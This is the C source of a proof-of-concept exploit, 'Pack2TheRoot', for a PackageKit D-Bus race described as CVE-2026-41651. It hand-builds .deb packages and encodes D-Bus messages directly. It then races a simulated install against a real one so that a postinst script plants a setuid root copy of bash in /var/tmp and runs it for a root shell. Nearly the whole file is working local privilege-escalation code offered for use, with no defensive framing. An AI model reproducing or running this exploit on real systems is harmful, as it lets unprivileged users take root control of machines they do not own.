#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define BUS_SOCK   "/var/run/dbus/system_bus_socket"
#define PK_SVC     "org.freedesktop.PackageKit"
#define PK_PATH    "/org/freedesktop/PackageKit"
#define PK_IFACE   "org.freedesktop.PackageKit"
#define TX_IFACE   "org.freedesktop.PackageKit.Transaction"
#define DBUS_IFACE "org.freedesktop.DBus"
#define DBUS_PATH  "/org/freedesktop/DBus"
#define DBUS_DST   "org.freedesktop.DBus"
#define SUID_PATH  "/var/tmp/.suid_bash"
#define TFLAG_NONE       0x0
#define TFLAG_SIMULATE   0x4

static uint32_t crc_tab[256];
static void crc_init(void) {
    for (unsigned i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int j = 0; j < 8; j++) c = (c & 1) ? (0xedb88320u ^ (c >> 1)) : (c >> 1);
        crc_tab[i] = c;
    }
}
static uint32_t crc32_buf(const void *src, size_t n) {
    const uint8_t *p = src; uint32_t c = 0xffffffffu;
    while (n--) c = crc_tab[(c ^ *p++) & 0xff] ^ (c >> 8);
    return c ^ 0xffffffffu;
}
static size_t gzip_store(const void *src, size_t len, uint8_t *dst) {
    if (len > 0xffff) return 0;
    uint8_t *p = dst;
    *p++ = 0x1f; *p++ = 0x8b; *p++ = 0x08; *p++ = 0x00;
    p[0]=p[1]=p[2]=p[3] = 0; p += 4; *p++ = 0; *p++ = 0xff;
    uint16_t ln = len, nln = ~ln;
    *p++ = 0x01; memcpy(p, &ln, 2); p += 2; memcpy(p, &nln, 2); p += 2;
    memcpy(p, src, len); p += len;
    uint32_t c = crc32_buf(src, len), s = (uint32_t)len;
    memcpy(p, &c, 4); p += 4; memcpy(p, &s, 4); p += 4;
    return p - dst;
}
static size_t tar_entry(uint8_t *buf, const char *name, const void *data,
                        size_t dlen, mode_t mode, char type) {
    memset(buf, 0, 512);
    snprintf((char*)buf, 100, "%s", name);
    snprintf((char*)buf+100, 8, "%07o", (unsigned)mode);
    snprintf((char*)buf+108, 8, "%07o", 0u);
    snprintf((char*)buf+116, 8, "%07o", 0u);
    snprintf((char*)buf+124, 12, "%011o", (unsigned)dlen);
    snprintf((char*)buf+136, 12, "%011o", (unsigned)time(NULL));
    memset(buf+148, ' ', 8);
    buf[156] = type;
    memcpy(buf+257, "ustar", 5); memcpy(buf+263, "00", 2);
    unsigned sum = 0; for (int i = 0; i < 512; i++) sum += buf[i];
    snprintf((char*)buf+148, 8, "%06o", sum);
    buf[154] = '\0'; buf[155] = ' ';
    size_t pad = dlen ? ((dlen + 511) / 512) * 512 : 0;
    if (dlen && data) memcpy(buf+512, data, dlen);
    if (pad > dlen) memset(buf+512+dlen, 0, pad - dlen);
    return 512 + pad;
}
static void ar_entry(FILE *f, const char *name, const void *data, size_t sz) {
    char h[61]; memset(h, ' ', 60); h[60] = 0;
    char t[17]; snprintf(t, 17, "%-16s", name); memcpy(h, t, 16);
    snprintf(t, 13, "%-12lu", (unsigned long)time(NULL)); memcpy(h+16, t, 12);
    memcpy(h+28, "0     ", 6); memcpy(h+34, "0     ", 6);
    memcpy(h+40, "100644  ", 8);
    snprintf(t, 11, "%-10zu", sz); memcpy(h+48, t, 10);
    h[58] = '`'; h[59] = '\n';
    fwrite(h, 1, 60, f); fwrite(data, 1, sz, f);
    if (sz % 2) fputc('\n', f);
}
static int build_deb(const char *dest, const char *pkg, const char *postinst) {
    static uint8_t tarbuf[65536], gzbuf[65536+256];
    memset(tarbuf, 0, sizeof tarbuf);
    crc_init();
    size_t off = 0;
    char ctrl[512];
    snprintf(ctrl, sizeof ctrl,
             "Package: %s\nVersion: 1.0\nArchitecture: all\n"
             "Maintainer: PoC\nDescription: PoC\n", pkg);
    off += tar_entry(tarbuf+off, "./", NULL, 0, 0755, '5');
    off += tar_entry(tarbuf+off, "./control", ctrl, strlen(ctrl), 0644, '0');
    if (postinst)
        off += tar_entry(tarbuf+off, "./postinst", postinst, strlen(postinst), 0755, '0');
    off += 1024;
    size_t ctrl_gz_len = gzip_store(tarbuf, off, gzbuf);
    if (!ctrl_gz_len) return -1;
    static uint8_t empty_tar[1024], data_gz[256];
    memset(empty_tar, 0, sizeof empty_tar);
    size_t data_gz_len = gzip_store(empty_tar, sizeof empty_tar, data_gz);
    FILE *f = fopen(dest, "wb");
    if (!f) return -1;
    fwrite("!<arch>\n", 1, 8, f);
    ar_entry(f, "debian-binary", "2.0\n", 4);
    ar_entry(f, "control.tar.gz", gzbuf, ctrl_gz_len);
    ar_entry(f, "data.tar.gz", data_gz, data_gz_len);
    fclose(f);
    return 0;
}

static int g_bus = -1;
static uint32_t g_serial = 1;

#define DIE(...) do { fprintf(stderr, "[!] " __VA_ARGS__); fputc('\n', stderr); exit(1); } while (0)
#define LOG(...) do { fprintf(stderr, "[*] " __VA_ARGS__); fputc('\n', stderr); } while (0)

static void bus_auth(int fd) {
    char line[128];
    if (write(fd, "\0", 1) != 1) DIE("auth nul");
    int n = snprintf(line, sizeof line, "AUTH EXTERNAL ");
    uid_t u = getuid();
    char tmp[16]; int tn = snprintf(tmp, sizeof tmp, "%u", u);
    for (int i = 0; i < tn; i++)
        n += snprintf(line + n, sizeof line - n, "%02x", (unsigned char)tmp[i]);
    n += snprintf(line + n, sizeof line - n, "\r\n");
    if (write(fd, line, n) != n) DIE("auth send");
    char buf[256]; int r = read(fd, buf, sizeof buf - 1);
    if (r <= 0 || strncmp(buf, "OK ", 3)) DIE("auth fail: %.*s", r, buf);
    if (write(fd, "BEGIN\r\n", 7) != 7) DIE("BEGIN");
}

struct buf { uint8_t *p; size_t cap, len; };
static void buf_init(struct buf *b) { b->cap = 4096; b->len = 0; b->p = malloc(b->cap); }
static void buf_grow(struct buf *b, size_t need) {
    if (b->len + need <= b->cap) return;
    while (b->len + need > b->cap) b->cap *= 2;
    b->p = realloc(b->p, b->cap);
}
static void buf_align(struct buf *b, size_t a) {
    size_t pad = (a - (b->len % a)) % a;
    buf_grow(b, pad);
    memset(b->p + b->len, 0, pad);
    b->len += pad;
}
static void buf_u8(struct buf *b, uint8_t v) { buf_grow(b, 1); b->p[b->len++] = v; }
static void buf_u32(struct buf *b, uint32_t v) {
    buf_align(b, 4); buf_grow(b, 4);
    memcpy(b->p + b->len, &v, 4); b->len += 4;
}
static void buf_u64(struct buf *b, uint64_t v) {
    buf_align(b, 8); buf_grow(b, 8);
    memcpy(b->p + b->len, &v, 8); b->len += 8;
}
static void buf_str(struct buf *b, const char *s) {
    uint32_t n = strlen(s);
    buf_u32(b, n); buf_grow(b, n + 1);
    memcpy(b->p + b->len, s, n + 1); b->len += n + 1;
}
static void buf_objpath(struct buf *b, const char *s) { buf_str(b, s); }
static void buf_sig(struct buf *b, const char *s) {
    uint8_t n = (uint8_t)strlen(s);
    buf_u8(b, n); buf_grow(b, n + 1);
    memcpy(b->p + b->len, s, n + 1); b->len += n + 1;
}
static void hf_str(struct buf *b, uint8_t code, const char *sig, const char *s) {
    buf_align(b, 8); buf_u8(b, code); buf_sig(b, sig); buf_str(b, s);
}
static void hf_objpath(struct buf *b, uint8_t code, const char *p) {
    buf_align(b, 8); buf_u8(b, code); buf_sig(b, "o"); buf_objpath(b, p);
}
static void hf_sig(struct buf *b, uint8_t code, const char *s) {
    buf_align(b, 8); buf_u8(b, code); buf_sig(b, "g"); buf_sig(b, s);
}

static uint32_t send_call(int fd, const char *dest, const char *path,
                          const char *iface, const char *member,
                          const char *body_sig, const uint8_t *body, size_t body_len) {
    uint32_t serial = g_serial++;
    struct buf hdr; buf_init(&hdr);
    struct buf fa; buf_init(&fa);
    hf_objpath(&fa, 1, path);
    if (iface) hf_str(&fa, 2, "s", iface);
    hf_str(&fa, 3, "s", member);
    if (dest) hf_str(&fa, 6, "s", dest);
    if (body_sig && *body_sig) hf_sig(&fa, 8, body_sig);
    buf_u8(&hdr, 'l');
    buf_u8(&hdr, 1);
    buf_u8(&hdr, 0);
    buf_u8(&hdr, 1);
    buf_u32(&hdr, (uint32_t)body_len);
    buf_u32(&hdr, serial);
    buf_u32(&hdr, (uint32_t)fa.len);
    buf_grow(&hdr, fa.len);
    memcpy(hdr.p + hdr.len, fa.p, fa.len);
    hdr.len += fa.len;
    buf_align(&hdr, 8);
    if (write(fd, hdr.p, hdr.len) != (ssize_t)hdr.len) DIE("write hdr");
    if (body_len && write(fd, body, body_len) != (ssize_t)body_len) DIE("write body");
    free(fa.p); free(hdr.p);
    return serial;
}

static uint32_t send_call_noreply(int fd, const char *dest, const char *path,
                                  const char *iface, const char *member,
                                  const char *body_sig, const uint8_t *body, size_t body_len) {
    uint32_t serial = g_serial++;
    struct buf hdr; buf_init(&hdr);
    struct buf fa; buf_init(&fa);
    hf_objpath(&fa, 1, path);
    if (iface) hf_str(&fa, 2, "s", iface);
    hf_str(&fa, 3, "s", member);
    if (dest) hf_str(&fa, 6, "s", dest);
    if (body_sig && *body_sig) hf_sig(&fa, 8, body_sig);
    buf_u8(&hdr, 'l');
    buf_u8(&hdr, 1);
    buf_u8(&hdr, 1);
    buf_u8(&hdr, 1);
    buf_u32(&hdr, (uint32_t)body_len);
    buf_u32(&hdr, serial);
    buf_u32(&hdr, (uint32_t)fa.len);
    buf_grow(&hdr, fa.len);
    memcpy(hdr.p + hdr.len, fa.p, fa.len);
    hdr.len += fa.len;
    buf_align(&hdr, 8);
    if (write(fd, hdr.p, hdr.len) != (ssize_t)hdr.len) DIE("write hdr");
    if (body_len && write(fd, body, body_len) != (ssize_t)body_len) DIE("write body");
    free(fa.p); free(hdr.p);
    return serial;
}

static size_t recv_msg(int fd, uint8_t *rbuf, size_t cap) {
    size_t got = 0;
    while (got < 16) {
        ssize_t n = read(fd, rbuf + got, 16 - got);
        if (n <= 0) DIE("recv prefix: %s", strerror(errno));
        got += n;
    }
    if (rbuf[0] != 'l') DIE("non-le bus");
    uint32_t body_len, fa_len;
    memcpy(&body_len, rbuf + 4, 4);
    memcpy(&fa_len, rbuf + 12, 4);
    size_t hdr_len = 16 + fa_len;
    if (hdr_len % 8) hdr_len += 8 - (hdr_len % 8);
    size_t total = hdr_len + body_len;
    if (total > cap) DIE("recv too big: %zu", total);
    while (got < total) {
        ssize_t n = read(fd, rbuf + got, total - got);
        if (n <= 0) DIE("recv body: %s", strerror(errno));
        got += n;
    }
    return total;
}

static const char *first_string(const uint8_t *msg, size_t total) {
    uint32_t fa_len;
    memcpy(&fa_len, msg + 12, 4);
    size_t hdr_len = 16 + fa_len;
    if (hdr_len % 8) hdr_len += 8 - (hdr_len % 8);
    if (hdr_len + 4 > total) return NULL;
    uint32_t slen;
    memcpy(&slen, msg + hdr_len, 4);
    if (hdr_len + 4 + slen + 1 > total) return NULL;
    return (const char *)(msg + hdr_len + 4);
}

static int connect_bus(void) {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) DIE("socket: %s", strerror(errno));
    struct sockaddr_un sa = { .sun_family = AF_UNIX };
    strncpy(sa.sun_path, BUS_SOCK, sizeof sa.sun_path - 1);
    if (connect(fd, (struct sockaddr*)&sa, sizeof sa) < 0)
        DIE("connect %s: %s", BUS_SOCK, strerror(errno));
    return fd;
}

static void hello(int fd) {
    static uint8_t rbuf[8192];
    send_call(fd, DBUS_DST, DBUS_PATH, DBUS_IFACE, "Hello", "", NULL, 0);
    recv_msg(fd, rbuf, sizeof rbuf);
}

static char *pk_create_transaction(int fd, char *out, size_t outsz) {
    static uint8_t rbuf[8192];
    send_call(fd, PK_SVC, PK_PATH, PK_IFACE, "CreateTransaction", "", NULL, 0);
    for (int i = 0; i < 8; i++) {
        size_t total = recv_msg(fd, rbuf, sizeof rbuf);
        if (rbuf[1] != 2) continue;
        const char *s = first_string(rbuf, total);
        if (!s || s[0] != '/') continue;
        strncpy(out, s, outsz - 1);
        out[outsz - 1] = 0;
        return out;
    }
    DIE("CreateTransaction: no reply path");
    return NULL;
}

static void pk_install_files(int fd, const char *txpath, uint64_t flags, const char *deb) {
    struct buf body; buf_init(&body);
    buf_u64(&body, flags);
    buf_align(&body, 4);
    size_t size_pos = body.len;
    buf_u32(&body, 0);
    buf_align(&body, 4);
    size_t arr_start = body.len;
    buf_str(&body, deb);
    uint32_t arr_len = (uint32_t)(body.len - arr_start);
    memcpy(body.p + size_pos, &arr_len, 4);
    send_call_noreply(fd, PK_SVC, txpath, TX_IFACE, "InstallFiles", "tas", body.p, body.len);
    free(body.p);
}

int main(int argc, char **argv) {
    int duration = (argc > 1) ? atoi(argv[1]) : 30;

    LOG("CVE-2026-41651: Pack2TheRoot - PackageKit D-Bus race. uid=%u", getuid());

    char dummy[64], payload[64];
    snprintf(dummy,   sizeof dummy,   "/tmp/.skp-dummy-%d.deb",   getpid());
    snprintf(payload, sizeof payload, "/tmp/.skp-payload-%d.deb", getpid());

    char postinst[256];
    snprintf(postinst, sizeof postinst,
             "#!/bin/sh\ninstall -m 4755 /bin/bash %s\n", SUID_PATH);

    if (build_deb(dummy,   "skp-dummy",   NULL))     DIE("build dummy");
    if (build_deb(payload, "skp-payload", postinst)) DIE("build payload");

    g_bus = connect_bus();
    bus_auth(g_bus);
    hello(g_bus);

    char txpath[128];
    pk_create_transaction(g_bus, txpath, sizeof txpath);

    pk_install_files(g_bus, txpath, TFLAG_SIMULATE, dummy);
    pk_install_files(g_bus, txpath, TFLAG_NONE,     payload);

    struct stat st;
    int landed = 0;
    for (int i = 0; i < duration; i++) {
        if (stat(SUID_PATH, &st) == 0 && (st.st_mode & S_ISUID) && st.st_uid == 0) {
            landed = 1;
            LOG("[+] LANDED at t+%ds — %s mode=%o uid=%d",
                i, SUID_PATH, st.st_mode & 07777, st.st_uid);
            break;
        }
        sleep(1);
    }

    if (!landed) {
        fprintf(stderr, "[-] did not land in %ds. retry, or try `systemctl restart packagekit` first.\n", duration);
        return 1;
    }

    LOG("executing root shell via %s -p", SUID_PATH);
    char *const argv2[] = { SUID_PATH, "-p", NULL };
    execv(SUID_PATH, argv2);
    DIE("exec %s: %s", SUID_PATH, strerror(errno));
    return 0;
}
